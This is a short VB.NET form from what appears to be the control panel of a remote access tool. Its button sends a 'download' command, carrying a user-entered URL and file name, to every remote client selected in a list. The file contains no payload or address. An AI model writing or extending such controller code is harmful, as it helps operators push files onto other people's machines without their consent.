Public Class Form17
    Public xxx As Integer
   

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick

        If TextBox2.Text = "" Then
            AvButton1.Enabled = False
        Else

            AvButton1.Enabled = True

            If TextBox1.Text = "" Then
                AvButton1.Enabled = False
            Else
                AvButton1.Enabled = True
            End If




        End If
    End Sub

    Private Sub Form17_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub AvButton1_Click(sender As Object, e As EventArgs) Handles AvButton1.Click
        Dim a As String = TextBox1.Text
        Dim aa As String = TextBox2.Text
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "download" & "|U|" & a & "|U|" & aa)
            Form1.colord()
        Next
        Me.Close()

    End Sub
End Class